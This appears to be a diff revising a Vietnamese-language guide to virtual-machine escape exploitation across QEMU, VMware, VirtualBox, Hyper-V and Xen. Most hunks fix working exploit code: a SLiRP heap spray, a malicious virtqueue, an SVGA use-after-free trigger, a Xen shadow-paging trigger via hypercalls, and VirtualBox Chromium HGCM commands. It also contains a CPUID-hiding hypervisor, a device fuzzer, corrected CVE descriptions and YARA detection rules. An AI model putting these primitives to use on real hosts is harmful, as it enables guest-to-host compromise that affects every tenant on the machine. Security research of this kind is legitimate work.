@@ -37,23 +37,23 @@
   - [4.1 VMware Architecture — Backdoor/RPCI](#41-vmware-architecture--backdoorrpci)
   - [4.2 CVE-2009-1244 — Cloudburst](#42-cve-2009-1244--cloudburst)
   - [4.3 CVE-2017-4901 — DnD Heap Overflow](#43-cve-2017-4901--vmware-drag-and-drop-heap-overflow)
-  - [4.4 CVE-2017-4902/4903/4904/4905 — Pwn2Own 2017](#44-cve-2017-490249034904--pwn2own-2017)
-  - [4.5 CVE-2020-3962 — SVGA UAF](#45-cve-2020-3962--svga-use-after-free)
+  - [4.4 CVE-2017-4902/4903/4904/4905 — Pwn2Own 2017 VMware Chain](#44-cve-2017-4902490349044905--pwn2own-2017-vmware-chain)
+  - [4.5 CVE-2020-3962 — VMware SVGA Use-After-Free](#45-cve-2020-3962--vmware-svga-use-after-free)
   - [4.6 CVE-2023-20869/20870 — Bluetooth & Host-Side](#46-cve-2023-2086920870--bluetooth--host-side-vulnerabilities)
   - [4.7 VMware RPCI Protocol — Full Analysis](#47-vmware-rpci-protocol--full-analysis)
 - [Phần 5: VirtualBox Escape](#phần-5-virtualbox-escape)
   - [5.1 VirtualBox Architecture](#51-virtualbox-architecture)
   - [5.2 CVE-2018-2698 — HGSMI OOB Read/Write](#52-cve-2018-2698--hgsmi-oob-readwrite)
-  - [5.3 CVE-2019-2525/2548 — 3D Acceleration Chain](#53-cve-2019-2525--cve-2019-2548)
+  - [5.3 CVE-2019-2525 + CVE-2019-2548 — VirtualBox 3D Acceleration Chain](#53-cve-2019-2525--cve-2019-2548--virtualbox-3d-acceleration-chain)
   - [5.4 CVE-2019-2525/2548 — Chromium Integer Overflow Detail](#54-cve-2019-25252548--chromium-3d-integer-overflow-detail)
-  - [5.5 CVE-2020-2902 — VMSVGA 3D UAF](#55-cve-2020-2902--virtualbox-3d-acceleration-uaf)
+  - [5.5 CVE-2020-2902 — VirtualBox 3D Acceleration UAF](#55-cve-2020-2902--virtualbox-3d-acceleration-uaf)
   - [5.6 CVE-2021-2145/2310 — NAT Integer Underflow](#56-cve-2021-21452310--virtualbox-nat-integer-underflow)
 - [Phần 6: Hyper-V Escape](#phần-6-hyper-v-escape)
   - [6.1 Hyper-V Architecture](#61-hyper-v-architecture)
   - [6.2 Hypercall Interface & Attack Vectors](#62-hyper-v-hypercall-interface--attack-vectors)
-  - [6.3 RemoteFX vGPU](#63-cve-2020-0904--remotefx-vgpu)
+  - [6.3 CVE-2020-0904 — RemoteFX vGPU Vulnerabilities](#63-cve-2020-0904--remotefx-vgpu-vulnerabilities)
   - [6.4 CVE-2021-28476 — vmswitch RCE](#64-cve-2021-28476--hyper-v-vmswitch-rce)
-  - [6.5 CVE-2022-21907 — HTTP.sys](#65-cve-2022-21907--httpsys--network-stack)
+  - [6.5 CVE-2022-21907 — Hyper-V Network Stack](#65-cve-2022-21907--hyper-v-network-stack)
   - [6.6 Hypercall Fuzzing](#66-hypercall-fuzzing--hafl2-method)
 - [Phần 7: Xen Escape](#phần-7-xen-escape)
   - [7.1 Xen Architecture](#71-xen-architecture)
@@ -273,7 +273,7 @@ void check_vmx(void) {
     
     /* EPT/VPID capabilities */
     uint64_t procbased = rdmsr(IA32_VMX_PROCBASED);
-    if ((procbased >> 32) & (1 << 31)) { /* Secondary controls available */
+    if ((procbased >> 32) & (1U << 31)) { /* Secondary controls available */
         uint64_t procbased2 = rdmsr(IA32_VMX_PROCBASED2);
         printf("[*] Secondary proc-based controls:\n");
         printf("    EPT: %s\n", ((procbased2 >> 32) & (1 << 1)) ? "supported" : "no");
@@ -814,10 +814,10 @@ Attack Surface theo Protocol:
 │ virtio-net         │ MMIO + DMA           │ Descriptor chain OOB│
 │ USB EHCI           │ MMIO + DMA           │ CVE-2020-14364 OOB  │
 │ USB xHCI           │ MMIO + DMA           │ Multiple OOB        │
-│ IDE/AHCI           │ Port I/O + MMIO+DMA  │ CVE-2015-6815 DoS   │
+│ e1000 NIC          │ MMIO + DMA           │ CVE-2015-6815 inf loop │
 │ VGA/SVGA           │ Port I/O + MMIO      │ CVE-2016-3710 VBE   │
 │ AC97/HDA Audio     │ MMIO + DMA           │ CVE-2017-5525 leak  │
-│ Megasas SCSI       │ MMIO + DMA           │ CVE-2017-9503 UAF   │
+│ Megasas SCSI       │ MMIO + DMA           │ CVE-2017-9503 NULL deref │
 │ SLiRP (network)    │ User-mode networking │ CVE-2019-6778 heap  │
 │ virtio-gpu         │ MMIO + DMA           │ CVE-2021-3546 OOB   │
 └────────────────────┴──────────────────────┴──────────────────────┘
@@ -1409,10 +1409,13 @@ struct rtl8139_cp_tx_desc {
     uint32_t buf_hi;  /* Buffer physical address high */
 } __attribute__((packed));
 
+/* opts1 flags (first dword) */
 #define CP_TX_OWN    (1U << 31)
 #define CP_TX_EOR    (1U << 30)  /* End of Ring */
 #define CP_TX_FS     (1U << 29)  /* First Segment */
 #define CP_TX_LS     (1U << 28)  /* Last Segment */
+
+/* opts2 flags (second dword) — checksum offload */
 #define CP_TX_IPCS   (1U << 18)  /* IP Checksum offload */
 #define CP_TX_TCPCS  (1U << 16)  /* TCP Checksum offload */
 
@@ -1491,7 +1494,8 @@ void analyze_leak(uint8_t *captured_pkt, size_t captured_len, size_t original_le
     
     /* Scan for potential pointers (look for 0x7f or 0x55 prefix on 64-bit) */
     for (size_t i = 0; i + 8 <= leaked; i += 8) {
-        uint64_t val = *(uint64_t *)(leak_data + i);
+        uint64_t val;
+        memcpy(&val, leak_data + i, sizeof(val));
         
         /* Typical QEMU text segment address (PIE) */
         if ((val >> 40) == 0x55 || (val >> 40) == 0x56) {
@@ -1900,8 +1904,9 @@ void setup_malicious_virtqueue(volatile void *mmio, void *vring_mem,
     desc[15].next = 0;
     
     /* Set up available ring */
+    /* Queue size phải match số descriptors thực tế (16, không phải 256) */
     struct vring_avail *avail = (struct vring_avail *)((char *)vring_mem + 
-                                 256 * sizeof(struct vring_desc));
+                                 16 * sizeof(struct vring_desc));
     avail->flags = 0;
     avail->idx = 1;
     avail->ring[0] = 0;  /* First descriptor in chain */
@@ -1986,20 +1991,19 @@ void setup_malicious_virtqueue(volatile void *mmio, void *vring_mem,
  * 5. Timer creation → QEMUTimer objects
  */
 
-/* Phương pháp 1: Spray qua network packets */
+/* Phương pháp 1: Spray qua TCP connections */
 void heap_spray_via_network(int count, size_t size) {
     /*
-     * Gửi UDP packets qua SLiRP
-     * Mỗi packet → mbuf allocation trong QEMU
-     * 
-     * mbuf size = sizeof(struct mbuf) + packet_size
-     * 
-     * Spray nhiều packets → fill heap holes
-     * Sau đó free một số → tạo hole ở vị trí desired
-     * Trigger vulnerability → object allocated at hole
+     * Dùng TCP (không phải UDP) qua SLiRP:
+     * - TCP connection tạo persistent struct socket + socket buffer (sbuf)
+     * - sbuf size tăng theo data nhận được → attacker control allocation size
+     * - Gửi TCP RST để free ngay (UDP socket chỉ free sau SO_EXPIRE timeout)
+     *
+     * Note: UDP mbufs là transient (free ngay sau NAT forward),
+     * và close() guest socket KHÔNG free SLiRP socket.
      */
     
-    if (count > 1024) count = 1024;  /* Prevent stack overflow */
+    if (count > 1024) count = 1024;
     int socks[1024];
     struct sockaddr_in addr;
     addr.sin_family = AF_INET;
@@ -2007,14 +2011,25 @@ void heap_spray_via_network(int count, size_t size) {
     inet_aton("10.0.2.2", &addr.sin_addr);
     
     char *buf = calloc(1, size);
-    
-    for (int i = 0; i < count; i++) {
-        socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
-        sendto(socks[i], buf, size, 0, (struct sockaddr*)&addr, sizeof(addr));
+    if (!buf) {
+        fprintf(stderr, "[-] calloc(%zu) failed\n", size);
+        return;
     }
     
-    /* Free specific sockets to create holes */
-    /* close(socks[target_index]); */
+    for (int i = 0; i < count; i++) {
+        socks[i] = socket(AF_INET, SOCK_STREAM, 0);
+        connect(socks[i], (struct sockaddr*)&addr, sizeof(addr));
+        send(socks[i], buf, size, 0);
+    }
+    
+    /* Free specific allocations: set SO_LINGER l_onoff=1, l_linger=0
+     * rồi close() → kernel gửi RST → SLiRP free socket ngay */
+    struct linger lo = { .l_onoff = 1, .l_linger = 0 };
+    for (int i = 0; i < count; i += 2) {
+        setsockopt(socks[i], SOL_SOCKET, SO_LINGER, &lo, sizeof(lo));
+        close(socks[i]);
+        socks[i] = -1;
+    }
     
     free(buf);
 }
@@ -2364,7 +2379,7 @@ int vmware_rpci_send(const char *msg, size_t len,
     /* Send message data (high-bandwidth) */
     memset(&cmd, 0, sizeof(cmd));
     cmd.cx = len;
-    cmd.bx = 0x00010000 | 0x00040000;  /* HB + data */
+    cmd.bx = 0;  /* BDOORHB_CMD_MESSAGE */
     cmd.dx = (channel_id << 16) | VMWARE_PORTHB;
     cmd.si = (uint32_t)(uintptr_t)msg;
     cmd.bp = (uint32_t)((uintptr_t)msg >> 32);
@@ -2497,10 +2512,10 @@ Exploit chain:
 #define SVGA_3D_CMD_SURFACE_DMA        1044
 #define SVGA_3D_CMD_CONTEXT_DEFINE     1045
 #define SVGA_3D_CMD_CONTEXT_DESTROY    1046
-#define SVGA_3D_CMD_SHADER_DEFINE      1049
-#define SVGA_3D_CMD_SHADER_DESTROY     1050
-#define SVGA_3D_CMD_SET_SHADER         1048
-#define SVGA_3D_CMD_DRAW_PRIMITIVES    1058
+#define SVGA_3D_CMD_SHADER_DEFINE      1059
+#define SVGA_3D_CMD_SHADER_DESTROY     1060
+#define SVGA_3D_CMD_SET_SHADER         1061
+#define SVGA_3D_CMD_DRAW_PRIMITIVES    1063
 
 typedef struct {
     uint32_t id;          /* Command type */
@@ -2617,8 +2632,8 @@ void trigger_svga_uaf(volatile uint32_t *fifo) {
  * Crafted HCI command với oversized parameter → stack overflow.
  *
  * CVE-2023-20870 — VMware Workstation Information Disclosure
- * Bug: OOB read trong host-side sharing functionality → leak host memory
- * (Ảnh hưởng HGFS component, KHÔNG liên quan Bluetooth)
+ * Bug: OOB read trong Bluetooth device emulation → leak host stack memory
+ * (Ảnh hưởng Bluetooth component khi passthrough enabled)
  *
  * Exploit approach:
  * 1. Enable Bluetooth passthrough trong VM config
@@ -2839,7 +2854,7 @@ typedef struct {
 #define SHFL_FN_WRITE              6
 #define SHFL_FN_LIST               8
 #define SHFL_FN_INFORMATION        9
-#define SHFL_FN_SYMLINK            16
+#define SHFL_FN_SYMLINK            18
 
 /*
  * TOCTOU exploit pseudocode:
@@ -2917,12 +2932,12 @@ void send_chromium_command(int vboxguest_fd, uint32_t client_id,
     call.cParms = 2;
     
     /* Parameter 0: command buffer (write) */
-    parms[0].type = 20; /* VMMDevHGCMParmType_LinAddr = 20 (0x14) */
+    parms[0].type = 4; /* VMMDevHGCMParmType_LinAddr */
     parms[0].u.Pointer.size = cmd_len;
     /* parms[0].u.Pointer.u.linearAddr = cmd_buf; */
     
     /* Parameter 1: reply buffer (read) */
-    parms[1].type = 20; /* VMMDevHGCMParmType_LinAddr */
+    parms[1].type = 4; /* VMMDevHGCMParmType_LinAddr */
     parms[1].u.Pointer.size = reply_len;
     /* parms[1].u.Pointer.u.linearAddr = reply_buf; */
     
@@ -2993,7 +3008,7 @@ struct cr_teximage2d_cmd {
 /* SVGA 3D command structures (từ vmware_pack_begin.h) */
 #define SVGA_3D_CMD_SURFACE_DEFINE    1040
 #define SVGA_3D_CMD_SURFACE_DESTROY   1041
-#define SVGA_3D_CMD_SURFACE_DMA       1052
+#define SVGA_3D_CMD_SURFACE_DMA       1044
 
 typedef struct {
     uint32_t id;    /* Command type (e.g., SVGA_3D_CMD_SURFACE_DEFINE) */
@@ -3026,8 +3041,7 @@ void build_uaf_trigger(uint8_t *fifo_buf, size_t *offset) {
     
     /* Step 1: Define surface */
     SVGA3dCmdHeader *hdr = (SVGA3dCmdHeader *)(fifo_buf + off);
-    hdr->id = 0;
-    hdr->cmd = SVGA_3D_CMD_SURFACE_DEFINE;
+    hdr->id = SVGA_3D_CMD_SURFACE_DEFINE;
     hdr->size = sizeof(SVGA3dCmdDefineSurface);
     off += sizeof(SVGA3dCmdHeader);
     
@@ -3041,8 +3055,7 @@ void build_uaf_trigger(uint8_t *fifo_buf, size_t *offset) {
     
     /* Step 2: Destroy surface — frees internal object */
     hdr = (SVGA3dCmdHeader *)(fifo_buf + off);
-    hdr->id = 0;
-    hdr->cmd = SVGA_3D_CMD_SURFACE_DESTROY;
+    hdr->id = SVGA_3D_CMD_SURFACE_DESTROY;
     hdr->size = sizeof(SVGA3dCmdDestroySurface);
     off += sizeof(SVGA3dCmdHeader);
     
@@ -3053,8 +3066,7 @@ void build_uaf_trigger(uint8_t *fifo_buf, size_t *offset) {
     /* Step 3: Heap spray — tạo nhiều surfaces cùng size để reclaim */
     for (int i = 2; i < 100; i++) {
         hdr = (SVGA3dCmdHeader *)(fifo_buf + off);
-        hdr->id = 0;
-        hdr->cmd = SVGA_3D_CMD_SURFACE_DEFINE;
+        hdr->id = SVGA_3D_CMD_SURFACE_DEFINE;
         hdr->size = sizeof(SVGA3dCmdDefineSurface);
         off += sizeof(SVGA3dCmdHeader);
         
@@ -3069,8 +3081,7 @@ void build_uaf_trigger(uint8_t *fifo_buf, size_t *offset) {
     
     /* Step 4: Reference destroyed surface — triggers UAF */
     hdr = (SVGA3dCmdHeader *)(fifo_buf + off);
-    hdr->id = 0;
-    hdr->cmd = SVGA_3D_CMD_SURFACE_DMA;
+    hdr->id = SVGA_3D_CMD_SURFACE_DMA;
     hdr->size = 4;  /* minimal — just sid */
     off += sizeof(SVGA3dCmdHeader);
     *(uint32_t *)(fifo_buf + off) = 1;  /* Reference freed sid=1 */
@@ -3595,17 +3606,17 @@ XSA-212 (CVE-2017-10912) — Grant table race
   Bug: Page reference counting error in grant table ops
   → Guest can map pages it shouldn't access
 
-XSA-231 (CVE-2017-15592) — x86 PV shadow paging bug
-  Bug: Recursive pagetable handling flaw
-  → Guest can write to hypervisor memory
+XSA-243 (CVE-2017-15592) — x86 HVM shadow paging self-mapping
+  Bug: Incorrect handling of self-linear shadow mappings with translated guests
+  → HVM guest can crash hypervisor or corrupt memory
 
 XSA-295 (CVE-2019-17340) — Grant table ref counting
   Bug: Multiple reference counting issues
   → Guest-to-host escape
 
-XSA-321 (CVE-2020-25603) — Missing unlock in event channel
-  Bug: Error path doesn't unlock → deadlock or worse
-  → DoS or information disclosure
+XSA-340 (CVE-2020-25603) — Missing memory barriers in event channel
+  Bug: Missing smp_*mb() when accessing event channel control structures
+  → Hypervisor crash, information disclosure, privilege escalation possible
 ```
 
 ---
@@ -3614,7 +3625,7 @@ XSA-321 (CVE-2020-25603) — Missing unlock in event channel
 
 ```c
 /*
- * XSA-231 / CVE-2017-15592 — Xen x86 PV shadow paging vulnerability
+ * XSA-243 / CVE-2017-15592 — Xen x86 HVM shadow paging vulnerability
  *
  * Bug: Recursive page table handling trong Xen's shadow paging code.
  * Xen tracks guest page tables bằng "shadow" copies.
@@ -3622,11 +3633,13 @@ XSA-321 (CVE-2020-25603) — Missing unlock in event channel
  * Xen shadow code đi vào infinite recursion hoặc xử lý sai.
  *
  * Impact: 
- * - Unprivileged PV guest có thể ghi vào Xen hypervisor memory
+ * - Unprivileged HVM guest (dùng shadow paging) có thể crash hoặc ghi vào Xen memory
  * - Full Xen compromise → control tất cả VMs trên host
  *
- * Chỉ ảnh hưởng PV guests (paravirtualized), KHÔNG ảnh HVM guests
- * Qubes OS (dùng Xen PV) đặc biệt bị ảnh hưởng
+ * Chỉ ảnh hưởng HVM guests dùng shadow paging, KHÔNG ảnh hưởng PV guests
+ * (Note: code bên dưới demo concept recursive page table bằng PV hypercalls;
+ *  XSA-243 thực tế trigger qua x86 page table manipulation trong HVM mode)
+ * Qubes OS có thể bị ảnh hưởng nếu dùng HVM guests với shadow paging (không phải HAP)
  */
 
 #include <stdio.h>
@@ -3710,6 +3723,10 @@ void trigger_recursive_shadow_bug(void) {
     /* Step 1: Allocate a page for PML4 */
     uint64_t *pml4 = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
+    if (pml4 == MAP_FAILED) {
+        perror("mmap");
+        return;
+    }
     memset(pml4, 0, 4096);
     
     /* Step 2: Get machine frame number of our page (Xen PV API)
@@ -3725,14 +3742,14 @@ void trigger_recursive_shadow_bug(void) {
     
     /* Submit MMU update via hypercall */
     xen_hypercall4(__HYPERVISOR_mmu_update, (unsigned long)&update, 1,
-                    0 /* success_count */, 0x7FF5 /* DOMID_SELF */);
+                    0 /* success_count */, 0x7FF0 /* DOMID_SELF */);
     
     /* Step 4: Pin as L4 table */
     struct mmuext_op pin_op;
     pin_op.cmd = MMUEXT_PIN_L4_TABLE;
     pin_op.arg1.mfn = mfn;
     xen_hypercall4(__HYPERVISOR_mmuext_op, (unsigned long)&pin_op, 1,
-                    0, 0x7FF5 /* DOMID_SELF */);
+                    0, 0x7FF0 /* DOMID_SELF */);
     
     /* Step 5: Access recursive address to trigger shadow code
      * Virtual address layout with recursive PML4[256]:
@@ -3745,7 +3762,7 @@ void trigger_recursive_shadow_bug(void) {
     struct mmuext_op flush_op;
     flush_op.cmd = MMUEXT_TLB_FLUSH_LOCAL;
     xen_hypercall4(__HYPERVISOR_mmuext_op, (unsigned long)&flush_op, 1,
-                    0, 0x7FF5 /* DOMID_SELF */);
+                    0, 0x7FF0 /* DOMID_SELF */);
     
     /* Shadow code processes recursive entry at wrong level
      * → shadow PTE cấp quyền write vào Xen hypervisor frame
@@ -3919,11 +3936,12 @@ void handle_cpuid(struct register_frame *regs) {
     }
     
     if (leaf == 0x40000000) {
-        /* Hide hypervisor brand — return "GenuineIntel" instead */
+        /* Hide hypervisor brand — return "GenuineIntel" instead.
+         * Leaf 0x40000000 dùng thứ tự EBX:ECX:EDX (khác leaf 0 dùng EBX:EDX:ECX) */
         eax = 0;  /* Max hypervisor leaf = 0 (no hypervisor leaves) */
-        ebx = 0x756E6547;  /* "Genu" */
-        ecx = 0x6C65746E;  /* "ntel" */
-        edx = 0x49656E69;  /* "ineI" */
+        ebx = 0x756E6547;  /* "Genu" — bytes 0-3 */
+        ecx = 0x49656E69;  /* "ineI" — bytes 4-7 */
+        edx = 0x6C65746E;  /* "ntel" — bytes 8-11 */
     }
     
     regs->rax = eax;
@@ -4180,8 +4198,8 @@ void save_host_cpu_state(saved_cpu_state_t *state) {
 
 /* VMCS I/O bitmap setup */
 /*
- * I/O bitmap A: ports 0x0000-0x7FFF (8KB)
- * I/O bitmap B: ports 0x8000-0xFFFF (8KB)
+ * I/O bitmap A: ports 0x0000-0x7FFF (4KB)
+ * I/O bitmap B: ports 0x8000-0xFFFF (4KB)
  *
  * Mỗi bit = 1 port, bit=1 → VM Exit khi IN/OUT port đó
  *
@@ -4321,14 +4339,11 @@ static void enable_vmx(void *info) {
         return;
     }
     
-    state->vmx_enabled = true;
-    pr_info("VMX enabled on CPU %d\n", smp_processor_id());
-    
     /* Allocate VMCS */
     state->vmcs_region = (void *)__get_free_page(GFP_KERNEL);
     if (!state->vmcs_region) {
-        pr_err("VMCS alloc failed\n");
-        return;
+        pr_err("VMCS alloc failed on CPU %d\n", smp_processor_id());
+        goto fail_vmxoff;
     }
     memset(state->vmcs_region, 0, VMCS_SIZE);
     state->vmcs_phys = virt_to_phys(state->vmcs_region);
@@ -4336,36 +4351,51 @@ static void enable_vmx(void *info) {
     
     if (vmcs_clear(state->vmcs_phys) || vmcs_load(state->vmcs_phys)) {
         pr_err("VMCS setup failed\n");
-        return;
+        goto fail_free_vmcs;
     }
     
     /* Allocate host stack */
     state->host_stack = kmalloc(STACK_SIZE, GFP_KERNEL);
     if (!state->host_stack) {
         pr_err("Host stack alloc failed\n");
-        return;
+        goto fail_free_vmcs;
     }
     
     /* Allocate MSR bitmaps (4KB, tất cả 0 = không intercept MSR nào) */
     state->msr_bitmap = (void *)__get_free_page(GFP_KERNEL);
     if (!state->msr_bitmap) {
         pr_err("MSR bitmap alloc failed\n");
-        return;
+        goto fail_free_stack;
     }
     memset(state->msr_bitmap, 0, PAGE_SIZE);
     
-    pr_info("VMCS loaded on CPU %d, ready to configure\n", smp_processor_id());
+    /* Chỉ set vmx_enabled SAU KHI mọi allocation thành công */
+    state->vmx_enabled = true;
+    pr_info("VMX enabled, VMCS loaded on CPU %d\n", smp_processor_id());
+    return;
+
+fail_free_stack:
+    kfree(state->host_stack);
+    state->host_stack = NULL;
+fail_free_vmcs:
+    free_page((unsigned long)state->vmcs_region);
+    state->vmcs_region = NULL;
+fail_vmxoff:
+    __asm__ volatile("vmxoff" ::: "memory");
+    native_write_cr4(native_read_cr4() & ~X86_CR4_VMXE);
+    free_page((unsigned long)state->vmxon_region);
+    state->vmxon_region = NULL;
 }
 
 /* VM exit handler — called by hardware on every VM exit */
-static void vm_exit_handler(void) {
+/* C handler — called from asm trampoline with guest regs saved */
+static void vm_exit_dispatch(void) {
     uint32_t reason = vmcs_read32(VM_EXIT_REASON) & 0xFFFF;
     uint64_t rip = vmcs_read64(GUEST_RIP);
     uint32_t insn_len = vmcs_read32(VM_EXIT_INSTRUCTION_LEN);
     
     switch (reason) {
     case EXIT_REASON_CPUID:
-        /* Fake CPUID to hide hypervisor */
         pr_debug("CPUID intercept at RIP=%llx\n", (unsigned long long)rip);
         vmcs_write64(GUEST_RIP, rip + insn_len);
         break;
@@ -4378,14 +4408,29 @@ static void vm_exit_handler(void) {
         vmcs_write64(GUEST_RIP, rip + insn_len);
         break;
     default:
-        /* EPT violation, external interrupt, etc — không advance RIP */
         break;
     }
-    
-    /* VMRESUME trở về guest */
-    __asm__ volatile("vmresume" ::: "memory");
-    /* Nếu VMRESUME fail, crash */
-    pr_err("VMRESUME failed! reason=%d\n", reason);
+}
+
+/* ASM trampoline: save ALL guest GPRs, call C handler, restore, VMRESUME.
+ * Phải dùng naked vì compiler prologue sẽ clobber guest registers. */
+__attribute__((naked)) static void vm_exit_handler(void) {
+    __asm__ volatile(
+        "push %%r15; push %%r14; push %%r13; push %%r12\n\t"
+        "push %%r11; push %%r10; push %%r9;  push %%r8\n\t"
+        "push %%rdi; push %%rsi; push %%rbp; push %%rdx\n\t"
+        "push %%rcx; push %%rbx; push %%rax\n\t"
+        "call vm_exit_dispatch\n\t"
+        "pop %%rax;  pop %%rbx;  pop %%rcx;  pop %%rdx\n\t"
+        "pop %%rbp;  pop %%rsi;  pop %%rdi;  pop %%r8\n\t"
+        "pop %%r9;   pop %%r10;  pop %%r11;  pop %%r12\n\t"
+        "pop %%r13;  pop %%r14;  pop %%r15\n\t"
+        "vmresume\n\t"
+        "jmp .Lfail\n\t"
+        ".Lfail:\n\t"
+        "int3\n\t"
+        ::: "memory"
+    );
 }
 
 /*
@@ -4845,17 +4890,18 @@ int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
     /* Parse fuzz input as register writes */
     size_t offset = 0;
     while (offset + 4 <= size) {
-        uint8_t reg = data[offset] % 0x100;   /* Register offset */
+        uint8_t reg = data[offset];   /* Register offset (full 0-255 range covers RTL8139 I/O space) */
         uint8_t width = 1 << (data[offset + 1] % 3);  /* 1, 2, or 4 bytes */
         uint32_t value;
         
         if (width == 1) {
             value = data[offset + 2];
         } else if (width == 2) {
-            value = *(uint16_t *)(data + offset + 2);
+            memcpy(&value, data + offset + 2, 2);  /* Avoid unaligned access */
+            value &= 0xFFFF;
         } else {
             if (offset + 6 > size) break;
-            value = *(uint32_t *)(data + offset + 2);
+            memcpy(&value, data + offset + 2, 4);
         }
         
         /* Write to RTL8139 MMIO */
@@ -5517,38 +5563,42 @@ echo "  (gdb) qemu-bp rtl8139"
 
 ### Detecting VM Escape Attempts
 
-```
-# === YARA Rules cho VM Escape Indicators ===
+```yara
+// === YARA Rules cho VM Escape Indicators ===
 
-rule VMEscape_QEMU_IO_Access:
+rule VMEscape_QEMU_IO_Access
+{
     meta:
         description = "Detect direct I/O port access to emulated devices"
         severity = "high"
     strings:
-        $iopl = { E4 ?? }  # IN AL, imm8
-        $outb = { E6 ?? }  # OUT imm8, AL
-        $inl  = { ED }     # IN EAX, DX
-        $outl = { EF }     # OUT DX, EAX
+        $iopl = { E4 ?? }  // IN AL, imm8
+        $outb = { E6 ?? }  // OUT imm8, AL
+        $inl  = { ED }     // IN EAX, DX
+        $outl = { EF }     // OUT DX, EAX
         
-        # FDC ports (VENOM)
-        $fdc_port = { 66 BA F5 03 }  # MOV DX, 0x03F5 (operand size prefix + MOV r16)
+        // FDC ports (VENOM)
+        $fdc_port = { 66 BA F5 03 }  // MOV DX, 0x03F5 (operand size prefix + MOV r16)
         
-        # VMware backdoor
-        $vmware_magic = { 68 68 58 4D 56 }  # PUSH 0x564D5868 (opcode 0x68 + LE imm32)
-        $vmware_port  = { 66 BA 58 56 }     # MOV DX, 0x5658 (16-bit operand)
+        // VMware backdoor
+        $vmware_magic = { 68 68 58 4D 56 }  // PUSH 0x564D5868 (opcode 0x68 + LE imm32)
+        $vmware_port  = { 66 BA 58 56 }     // MOV DX, 0x5658 (16-bit operand)
         
     condition:
         any of ($iopl, $outb, $inl, $outl) and 
         any of ($fdc_port, $vmware_magic, $vmware_port)
+}
 
-rule VMEscape_Hypercall:
+rule VMEscape_Hypercall
+{
     meta:
         description = "Detect hypercall instructions"
     strings:
-        $vmcall  = { 0F 01 C1 }  # VMCALL (Intel)
-        $vmmcall = { 0F 01 D9 }  # VMMCALL (AMD)
+        $vmcall  = { 0F 01 C1 }  // VMCALL (Intel)
+        $vmmcall = { 0F 01 D9 }  // VMMCALL (AMD)
     condition:
         any of them
+}
 ```
 
 ```yaml
